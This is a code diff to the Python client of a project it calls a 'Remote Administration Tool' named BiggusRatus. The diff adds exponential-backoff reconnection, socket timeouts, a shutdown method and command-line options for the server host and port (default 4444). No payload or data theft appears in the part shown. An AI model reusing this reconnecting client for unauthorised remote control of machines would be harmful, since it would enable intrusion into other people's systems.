@@ -1,3 +1,4 @@
+import argparse
 import json
 import logging
 import queue
@@ -12,7 +13,11 @@ from common.constants import (
     DEFAULT_PORT,
     HANDSHAKE_ACTION,
     HELP_ACTION,
+    MAX_RETRIES,
+    RETRY_BACKOFF_FACTOR,
     RETRY_DELAY,
+    RETRY_DELAY_MAX,
+    SOCKET_TIMEOUT_SEC,
     TEST_ACTION,
 )
 from client.commands.help import HelpCommand
@@ -42,6 +47,25 @@ class Client:
         self._commands = {
             HELP_ACTION: HelpCommand(),
         }
+        self._retry_count = 0
+        self._shutdown = False
+
+    @staticmethod
+    def _calculate_backoff(attempt: int) -> float:
+        """Calculate backoff delay with exponential backoff and jitter."""
+        import random
+        delay = min(RETRY_DELAY * (RETRY_BACKOFF_FACTOR**attempt), RETRY_DELAY_MAX)
+        jitter = delay * 0.1 * random.random()
+        return delay + jitter
+
+    def _reset_retry_count(self) -> None:
+        """Reset retry count after successful connection."""
+        self._retry_count = 0
+
+    def _increment_retry(self) -> int:
+        """Increment and return the retry count."""
+        self._retry_count += 1
+        return self._retry_count
 
     def connect(self) -> None:
         if self.socket is not None:
@@ -51,13 +75,18 @@ class Client:
         sock.settimeout(CONNECT_TIMEOUT_SEC)
         try:
             sock.connect((self.host, self.port))
+        except socket.timeout as exc:
+            logger.error(f"Connection timeout to {self.host}:{self.port}: {exc}")
+            sock.close()
+            raise ConnectionError(f"Connection timeout: {exc}") from exc
         except (ConnectionRefusedError, OSError) as exc:
             logger.error(f"Failed to connect to {self.host}:{self.port}: {exc}")
             sock.close()
             raise
-        sock.settimeout(None)
+        sock.settimeout(SOCKET_TIMEOUT_SEC)
         self.socket = sock
         self.connected = True
+        self._reset_retry_count()
         logger.info(f"TCP connection established to {self.host}:{self.port}")
 
     def handshake(self) -> None:
@@ -126,9 +155,15 @@ class Client:
             return
         try:
             while self.connected:
-                raw = recv_frame(self.socket)
-                message = decode_message(raw)
-                self._handle_incoming_message(message)
+                try:
+                    raw = recv_frame(self.socket)
+                    message = decode_message(raw)
+                    self._handle_incoming_message(message)
+                except socket.timeout:
+                    if self.connected:
+                        logger.debug("Socket timeout, continuing receive loop")
+                        continue
+                    break
         except (ConnectionError, OSError, ProtocolError, json.JSONDecodeError) as exc:
             logger.warning(f"Receive loop ended: {exc}")
         finally:
@@ -201,28 +236,90 @@ class Client:
             self.socket = None
         logger.info("Client disconnected")
 
+    def shutdown(self) -> None:
+        """Shutdown the client completely (no reconnection)."""
+        self._shutdown = True
+        self.disconnect()
+        logger.info("Client shutdown requested")
+
+
+def parse_args() -> argparse.Namespace:
+    """Parse command-line arguments."""
+    parser = argparse.ArgumentParser(
+        description="BiggusRatus Client - Remote Administration Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python -m client.client                           # Connect to localhost:4444
+  python -m client.client --host 192.168.1.100      # Connect to specific host
+  python -m client.client --port 8443               # Connect to specific port
+  python -m client.client --verbose                 # Enable debug logging
+        """,
+    )
+    parser.add_argument(
+        "--host",
+        type=str,
+        default=DEFAULT_CLIENT_HOST,
+        help=f"Server host to connect to (default: {DEFAULT_CLIENT_HOST})",
+    )
+    parser.add_argument(
+        "--port",
+        type=int,
+        default=DEFAULT_PORT,
+        help=f"Server port to connect to (default: {DEFAULT_PORT})",
+    )
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        help="Enable verbose (debug) logging",
+    )
+    return parser.parse_args()
+
 
 def main() -> None:
+    args = parse_args()
+    log_level = logging.DEBUG if args.verbose else logging.INFO
     logging.basicConfig(
-        level=logging.INFO,
+        level=log_level,
         format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     )
-    client = Client()
-    while True:
+    client = Client(host=args.host, port=args.port)
+    logger.info(f"Connecting to {args.host}:{args.port}...")
+    while not client._shutdown:
         try:
             client.run_session()
         except KeyboardInterrupt:
-            client.disconnect()
+            client.shutdown()
             logger.info("Client shutting down")
             break
         except (ConnectionRefusedError, ConnectionError, OSError) as exc:
-            logger.warning(f"Connection lost or failed: {exc}")
+            if client._shutdown:
+                break
+            attempt = client._increment_retry()
+            if attempt > MAX_RETRIES:
+                logger.error(f"Max retries ({MAX_RETRIES}) exceeded. Giving up.")
+                break
+            backoff = client._calculate_backoff(attempt - 1)
+            logger.warning(
+                f"Connection lost or failed (attempt {attempt}/{MAX_RETRIES}): {exc}. "
+                f"Retrying in {backoff:.1f}s..."
+            )
             client.disconnect()
-            time.sleep(RETRY_DELAY)
+            time.sleep(backoff)
         except (ProtocolError, ValueError, json.JSONDecodeError) as exc:
-            logger.error(f"Protocol error: {exc}")
+            if client._shutdown:
+                break
+            attempt = client._increment_retry()
+            if attempt > MAX_RETRIES:
+                logger.error(f"Max retries ({MAX_RETRIES}) exceeded. Giving up.")
+                break
+            backoff = client._calculate_backoff(attempt - 1)
+            logger.error(
+                f"Protocol error (attempt {attempt}/{MAX_RETRIES}): {exc}. "
+                f"Retrying in {backoff:.1f}s..."
+            )
             client.disconnect()
-            time.sleep(RETRY_DELAY)
+            time.sleep(backoff)
 
 
 if __name__ == "__main__":
